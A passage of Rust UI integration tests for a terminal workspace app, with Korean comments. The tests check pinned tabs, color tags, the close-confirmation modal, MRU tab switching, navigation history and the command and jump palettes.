fn pinned_tab_guards_close_and_context_menu_colors_persist(cx: &mut TestAppContext) {
    let path = state_path("pin-color");
    let (view, cx) = open(cx, path.clone());
    cx.simulate_keystrokes("cmd-t");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).tabs().len(), 2);

    // 탭 0을 우클릭해 컨텍스트 메뉴를 연다.
    let tab0 = cx
        .debug_bounds("session-tab-0")
        .expect("session-tab-0")
        .center();
    cx.simulate_mouse_down(tab0, MouseButton::Right, Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("tab-context-menu").is_some());

    // `Pin Tab` 클릭 → 탭 0이 고정되고 핀 아이콘(`tab-pin-0`)이 표시된다.
    let pin_item = cx
        .debug_bounds("tab-menu-pin")
        .expect("tab-menu-pin")
        .center();
    cx.simulate_click(pin_item, Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("tab-context-menu").is_none());
    assert!(cx.debug_bounds("tab-pin-0").is_some());
    assert!(layout_of(&view, cx).is_tab_pinned(0));

    // 다시 탭 0을 우클릭해 Purple 색상 태그를 지정한다.
    cx.simulate_mouse_down(tab0, MouseButton::Right, Modifiers::default());
    cx.run_until_parked();
    let purple = cx
        .debug_bounds("tab-menu-color-purple")
        .expect("tab-menu-color-purple")
        .center();
    cx.simulate_click(purple, Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("tab-color-0").is_some());
    assert_eq!(
        layout_of(&view, cx).tab_color(0),
        Some(krill_app::layout::TabColor::Purple)
    );

    // `layout.bin` 복원 시 고정 여부와 색상 태그가 그대로 유지된다.
    let disk = Layout::load(&path).expect("load layout.bin");
    assert!(disk.is_tab_pinned(0));
    assert_eq!(disk.tab_color(0), Some(krill_app::layout::TabColor::Purple));

    // 고정된 탭 0을 활성화하고 `⌘W`를 누르면 탭이 바로 닫히지 않고 확인 모달이 뜬다.
    cx.simulate_keystrokes("cmd-1");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 0);
    cx.simulate_keystrokes("cmd-w");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).tabs().len(), 2);
    assert!(cx.debug_bounds("pinned-tab-close-dialog").is_some());

    // 취소를 누르면 모달만 닫히고 탭은 살아남는다.
    let cancel_btn = cx
        .debug_bounds("cancel-close-pinned-tab")
        .expect("cancel-close-pinned-tab")
        .center();
    cx.simulate_click(cancel_btn, Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("pinned-tab-close-dialog").is_none());
    assert_eq!(layout_of(&view, cx).tabs().len(), 2);

    // 다시 `⇧⌘W`(`CloseTab`)를 누르고 확인(`confirm-close-pinned-tab`)을 누르면 비로소 탭 0이 닫힌다.
    cx.simulate_keystrokes("cmd-shift-w");
    cx.run_until_parked();
    let confirm_btn = cx
        .debug_bounds("confirm-close-pinned-tab")
        .expect("confirm-close-pinned-tab")
        .center();
    cx.simulate_click(confirm_btn, Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("pinned-tab-close-dialog").is_none());
    assert_eq!(layout_of(&view, cx).tabs().len(), 1);
}

/// OWE-734: `Ctrl+Tab` MRU 최근 탭 스위처와 일괄 닫기(`Close Others`, `Close Tabs to the Right`, `Close All Editor Tabs`).
#[gpui::test]
fn ctrl_tab_mru_switcher_and_bulk_close_actions(cx: &mut TestAppContext) {
    let path = state_path("mru-bulk");
    let (view, cx) = open(cx, path);
    // 탭 4개 생성 (0, 1, 2, 3), 탭 1·3 순서로 포커스 → MRU = [3, 1, 2, 0]
    cx.simulate_keystrokes("cmd-t cmd-t cmd-t cmd-2 cmd-4");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).tabs().len(), 4);
    assert_eq!(layout_of(&view, cx).active(), 3);

    // Ctrl+Tab 1회 → 직전 포커스 탭인 1번 탭으로 전환되고 RecentTabSwitcher 오버레이가 표시된다.
    cx.simulate_keystrokes("ctrl-tab");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 1);
    assert!(cx.debug_bounds("recent-tab-switcher").is_some());

    // Ctrl을 놓으면(ModifiersChangedEvent) 스위처가 닫히고 MRU가 [1, 3, 2, 0]으로 확정된다.
    cx.simulate_modifiers_change(Modifiers::default());
    cx.run_until_parked();
    assert!(cx.debug_bounds("recent-tab-switcher").is_none());

    // 다시 Ctrl+Tab 1회 → 방금 직전 탭이었던 3번 탭으로 돌아간다.
    cx.simulate_keystrokes("ctrl-tab");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 3);
    cx.simulate_modifiers_change(Modifiers::default());
    cx.run_until_parked();

    // 탭 0을 고정한 뒤 탭 1 우클릭 메뉴에서 `Close Tabs to the Right` 실행 → 탭 2·3이 닫히고 고정된 탭 0과 탭 1만 남는다.
    let tab0 = cx
        .debug_bounds("session-tab-0")
        .expect("session-tab-0")
        .center();
    cx.simulate_mouse_down(tab0, MouseButton::Right, Modifiers::default());
    cx.run_until_parked();
    let pin_item = cx
        .debug_bounds("tab-menu-pin")
        .expect("tab-menu-pin")
        .center();
    cx.simulate_click(pin_item, Modifiers::default());
    cx.run_until_parked();

    let tab1 = cx
        .debug_bounds("session-tab-1")
        .expect("session-tab-1")
        .center();
    cx.simulate_mouse_down(tab1, MouseButton::Right, Modifiers::default());
    cx.run_until_parked();
    let close_right = cx
        .debug_bounds("tab-menu-close-right")
        .expect("tab-menu-close-right")
        .center();
    cx.simulate_click(close_right, Modifiers::default());
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).tabs().len(), 2);
}

/// MK-176 (OWE-730): 워크트리·탭·설정 뷰 전환 히스토리 스택(Back/Forward `⌘⌥←`/`⌘⌥→` 및 타이틀바 `<` `>` 버튼) 검증.
#[gpui::test]
fn navigation_history_back_forward_shortcuts_and_buttons(cx: &mut TestAppContext) {
    let path = state_path("nav-history");
    let (view, cx) = open(cx, path);
    cx.run_until_parked();

    // 초기에는 뒤로/앞으로 이동할 히스토리가 없다.
    cx.update(|_, cx| {
        assert!(!view.read(cx).can_navigate_back(cx));
        assert!(!view.read(cx).can_navigate_forward(cx));
    });
    assert!(cx.debug_bounds("sidebar-history-prev").is_some());
    assert!(cx.debug_bounds("sidebar-history-next").is_some());

    // 탭 0 -> 탭 1 -> 탭 2 생성 및 이동.
    cx.simulate_keystrokes("cmd-t");
    cx.run_until_parked();
    cx.simulate_keystrokes("cmd-t");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 2);
    cx.update(|_, cx| {
        assert!(view.read(cx).can_navigate_back(cx));
        assert!(!view.read(cx).can_navigate_forward(cx));
    });

    // 설정 페이지를 열었다가 닫으면 설정 뷰도 히스토리에 기록된다.
    cx.update(|window, cx| {
        view.update(cx, |s, cx| {
            s.open_settings(krill_app::settings::AdminTab::Shortcuts, Some(window), cx);
        });
    });
    cx.run_until_parked();
    cx.update(|_, cx| assert!(view.read(cx).settings.is_some()));

    // ⌘⌥← (NavigateBack): 설정 뷰에서 직전 탭(탭 2)으로 복귀한다.
    cx.simulate_keystrokes("cmd-alt-left");
    cx.run_until_parked();
    cx.update(|_, cx| {
        assert!(view.read(cx).settings.is_none());
        assert_eq!(view.read(cx).layout.active(), 2);
        assert!(view.read(cx).can_navigate_back(cx));
        assert!(view.read(cx).can_navigate_forward(cx));
    });

    // 한 번 더 ⌘⌥←: 탭 1로 이동.
    cx.simulate_keystrokes("cmd-alt-left");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 1);

    // 한 번 더 ⌘⌥←: 탭 0으로 이동.
    cx.simulate_keystrokes("cmd-alt-left");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 0);
    cx.update(|_, cx| {
        assert!(!view.read(cx).can_navigate_back(cx));
        assert!(view.read(cx).can_navigate_forward(cx));
    });

    // ⌘⌥→ (NavigateForward): 탭 1로 앞으로 이동.
    cx.simulate_keystrokes("cmd-alt-right");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 1);

    // 타이틀바의 `>` (`sidebar-history-next`) 버튼 클릭으로 탭 2로 이동.
    let next_center = cx
        .debug_bounds("sidebar-history-next")
        .expect("sidebar-history-next bounds")
        .center();
    cx.simulate_click(next_center, Modifiers::default());
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 2);

    // 타이틀바의 `<` (`sidebar-history-prev`) 버튼 클릭으로 탭 1로 이동.
    let prev_center = cx
        .debug_bounds("sidebar-history-prev")
        .expect("sidebar-history-prev bounds")
        .center();
    cx.simulate_click(prev_center, Modifiers::default());
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 1);

    // 탭 2를 닫은 뒤 앞으로 이동하면 닫힌 탭 2는 건너뛰고 설정 뷰로 이동한다.
    cx.simulate_keystrokes("cmd-3");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 2);
    // 탭 0 -> 탭 1 -> 탭 2 상태에서 탭 1을 닫고 뒤로 가기 검증:
    cx.simulate_keystrokes("cmd-2");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 1);
    cx.simulate_keystrokes("cmd-w");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).tabs().len(), 2);
    cx.simulate_keystrokes("cmd-alt-left");
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 0);
}

/// OWE-757: 사이드바에 git 저장소가 열려 있을 때(`sidebar.has_trees() == true`)도
/// (a) 비-git 폴더/기본 셸 탭, (b) 워크트리 하위 디렉터리 탭, (c) 에디터 파일 탭, (d) 원격 호스트 탭으로
/// `⌘⌥←`/`⌘⌥→` 탐색 히스토리 이동이 누락되지 않는지 검증한다.
#[gpui::test]
fn navigation_history_reaches_non_git_subdir_file_and_remote_tabs_with_sidebar_trees(
    cx: &mut TestAppContext,
) {
    struct Memory(sidebar::Snapshot);
    impl sidebar::Source for Memory {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(self.0.clone())
        }
    }

    let snapshot = sidebar::Snapshot {
        sessions: Vec::new(),
        trees: [(
            PathBuf::from("/repo"),
            vec![PathBuf::from("/repo/main"), PathBuf::from("/repo/feature")],
        )]
        .into(),
    };

    let path = state_path("nav-history-owe-757");
    let (view, cx) = open(cx, path);
    cx.update(|_, cx| {
        let sidebar = view.read(cx).sidebar.clone();
        sidebar.update(cx, |s, cx| s.connect_source(Arc::new(Memory(snapshot)), cx));
    });
    cx.run_until_parked();

    cx.update(|_, cx| {
        assert!(view.read(cx).sidebar.read(cx).has_trees());
    });

    // 탭 0: 초기 기본 셸 탭 ($HOME 등 비-git 폴더)
    // 탭 1 (a): 명시적 비-git 폴더 탭 (`/tmp/plain-folder`)
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.new_folder_tab(
                std::path::Path::new("/tmp/plain-folder"),
                Program::Login,
                cx,
            );
        });
    });
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 1);
    cx.update(|_, cx| {
        let s = view.read(cx);
        let p = s.layout.focused().expect("focused pane");
        assert_eq!(s.worktree_for_pane(p, cx), None);
    });

    // 탭 2 (b): 워크트리 하위 디렉터리에서 열린 탭 (`/repo/main/crates/sub`)
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.new_folder_tab(
                std::path::Path::new("/repo/main/crates/sub"),
                Program::Login,
                cx,
            );
        });
    });
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 2);
    cx.update(|_, cx| {
        let s = view.read(cx);
        let p = s.layout.focused().expect("focused pane");
        assert_eq!(
            s.worktree_for_pane(p, cx),
            Some(PathBuf::from("/repo/main"))
        );
    });

    // 탭 3 (c): 에디터 파일 탭 (`open_file`)
    let tmp_file = std::env::temp_dir().join(format!("krill-owe-757-{}.rs", std::process::id()));
    std::fs::write(&tmp_file, "fn main() {}\n").expect("write temp file");
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.open_file(tmp_file.clone(), cx);
        });
    });
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 3);
    cx.update(|_, cx| {
        let s = view.read(cx);
        let p = s.layout.focused().expect("focused pane");
        assert_eq!(s.worktree_for_pane(p, cx), None);
    });

    // 탭 4 (d): 원격 호스트 탭 (`HostId::Remote`)
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.new_folder_tab_on(
                krill_app::hosts::HostId::Remote("remote-dev".into()),
                std::path::Path::new("/home/dev/project"),
                Program::Login,
                cx,
            );
        });
    });
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 4);
    cx.update(|_, cx| {
        let s = view.read(cx);
        let p = s.layout.focused().expect("focused pane");
        assert_eq!(s.worktree_for_pane(p, cx), None);
    });

    // 탭 5: 워크트리 루트 탭 (`/repo/feature`)
    cx.update(|_, cx| {
        view.update(cx, |s, cx| {
            s.new_folder_tab(std::path::Path::new("/repo/feature"), Program::Login, cx);
        });
    });
    cx.run_until_parked();
    assert_eq!(layout_of(&view, cx).active(), 5);

    // ⌘⌥← 로 탭 5 -> 4(원격) -> 3(파일) -> 2(하위 디렉터리) -> 1(비-git 폴더) -> 0(기본 셸) 순서대로 역탐색.
    for expected_tab in (0..=4).rev() {
        cx.simulate_keystrokes("cmd-alt-left");
        cx.run_until_parked();
        assert_eq!(
            layout_of(&view, cx).active(),
            expected_tab,
            "expected NavigateBack to reach tab {expected_tab}"
        );
    }
    cx.update(|_, cx| {
        assert!(!view.read(cx).can_navigate_back(cx));
        assert!(view.read(cx).can_navigate_forward(cx));
    });

    // ⌘⌥→ 로 탭 0 -> 1 -> 2 -> 3 -> 4 -> 5 순서대로 정탐색.
    for expected_tab in 1..=5 {
        cx.simulate_keystrokes("cmd-alt-right");
        cx.run_until_parked();
        assert_eq!(
            layout_of(&view, cx).active(),
            expected_tab,
            "expected NavigateForward to reach tab {expected_tab}"
        );
    }
    cx.update(|_, cx| {
        assert!(view.read(cx).can_navigate_back(cx));
        assert!(!view.read(cx).can_navigate_forward(cx));
    });

    std::fs::remove_file(&tmp_file).ok();
}

/// OWE-865: ⇧⌘P 명령 팔레트는 액션부터 보여주고, ⌘1로 첫 행(빠른 액션)을 바로 실행한다.
#[gpui::test]
fn command_palette_digit_runs_settings_action(cx: &mut TestAppContext) {
    use krill_proto::SessionId;
    use krill_proto::control::{AgentState, AgentStatus};

    struct Memory(sidebar::Snapshot);
    impl sidebar::Source for Memory {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(self.0.clone())
        }
    }
    let snapshot = sidebar::Snapshot {
        sessions: vec![sidebar::Session {
            id: SessionId(5),
            status: AgentStatus {
                state: AgentState::Working,
                agent: "claude".into(),
                ..AgentStatus::UNKNOWN
            },
            worktree: Some("/repo/main".into()),
            cwd: None,
            account: None,
        }],
        trees: [("/repo".into(), vec!["/repo/main".into()])].into(),
    };
    let (view, cx) = open(cx, state_path("cmd-palette"));
    // 볼트 실제 데몬을 타지 않게 빈 결과 목을 단다(테스트 머신의 실제 볼트에 좌우되지 않는다).
    let call: krill_app::agent_history::Call = std::sync::Arc::new(move |r| {
        use krill_proto::agent_history::{Action, Response, SearchSnapshot, Snapshot};
        use krill_proto::control::{Reply, Request};
        Ok(Reply::AgentHistory(match r {
            Request::AgentHistory(Action::Scan) => Response::Scanned(Snapshot {
                entries: Vec::new(),
                truncated: false,
                skipped: false,
            }),
            Request::AgentHistory(Action::Search(_)) => Response::Searched(SearchSnapshot {
                hits: Vec::new(),
                truncated: false,
                skipped: false,
            }),
            _ => unreachable!(),
        }))
    });
    cx.update(|_, cx| {
        let history = view.read(cx).history.clone();
        history.update(cx, |h, _| h.set_call(call));
        let sidebar = view.read(cx).sidebar.clone();
        sidebar.update(cx, |s, cx| {
            s.connect_source(std::sync::Arc::new(Memory(snapshot)), cx);
        });
    });
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).jump.is_none()));

    cx.simulate_keystrokes("cmd-shift-p");
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).jump.is_some()));
    assert_eq!(
        cx.update(|_, cx| view.read(cx).jump.as_ref().unwrap().0.read(cx).mode()),
        krill_app::jump::Mode::Commands
    );

    // "설정"으로 거르면 설정 열기 액션 1행만 남는다.
    cx.simulate_input("설정");
    cx.run_until_parked();
    assert_eq!(
        cx.update(|_, cx| view.read(cx).jump.as_ref().unwrap().0.read(cx).row_count()),
        1
    );

    // ⌘1 즉시 실행: 팔레트가 닫히고 설정 페이지가 열린다(탭은 그대로).
    let tabs_before = layout_of(&view, cx).tabs().len();
    cx.simulate_keystrokes("cmd-1");
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).jump.is_none()));
    assert!(cx.update(|_, cx| view.read(cx).settings.is_some()));
    assert_eq!(layout_of(&view, cx).tabs().len(), tabs_before);
}

/// OWE-865: ⌘J 팔레트에서 세션 없는 워크트리를 Enter로 열면 새 탭에 새 세션을 만든다.
#[gpui::test]
fn jump_palette_opens_sessionless_worktree_in_new_tab(cx: &mut TestAppContext) {
    use krill_proto::SessionId;
    use krill_proto::control::{AgentState, AgentStatus};

    struct Memory(sidebar::Snapshot);
    impl sidebar::Source for Memory {
        fn fetch(&self) -> std::io::Result<sidebar::Snapshot> {
            Ok(self.0.clone())
        }
    }
    let session = |id, tree: &str| sidebar::Session {
        id: SessionId(id),
        status: AgentStatus {
            state: AgentState::Working,
            agent: "claude".into(),
            ..AgentStatus::UNKNOWN
        },
        worktree: Some(tree.into()),
        cwd: None,
        account: None,
    };
    let snapshot = sidebar::Snapshot {
        sessions: vec![session(5, "/repo/main")],
        trees: [(
            "/repo".into(),
            vec!["/repo/empty".into(), "/repo/main".into()],
        )]
        .into(),
    };
    let (view, cx) = open(cx, state_path("jump-worktree"));
    cx.update(|_, cx| {
        let sidebar = view.read(cx).sidebar.clone();
        sidebar.update(cx, |s, cx| {
            s.connect_source(std::sync::Arc::new(Memory(snapshot)), cx);
        });
    });
    cx.run_until_parked();

    cx.simulate_keystrokes("cmd-j");
    cx.run_until_parked();
    assert!(cx.update(|_, cx| view.read(cx).jump.is_some()));

    cx.simulate_input("empty");
    cx.run_until_parked();
    cx.simulate_keystrokes("enter");
    cx.run_until_parked();

    assert!(cx.update(|_, cx| view.read(cx).jump.is_none()));
    let layout = layout_of(&view, cx);
    assert_eq!(layout.tabs().len(), 2);
    let pane = layout.active_tab().focused;
    let cwd = layout
        .launch(pane)
        .map(|c| c.cwd.clone())
        .unwrap_or_default();
    assert_eq!(cwd, b"/repo/empty");
}
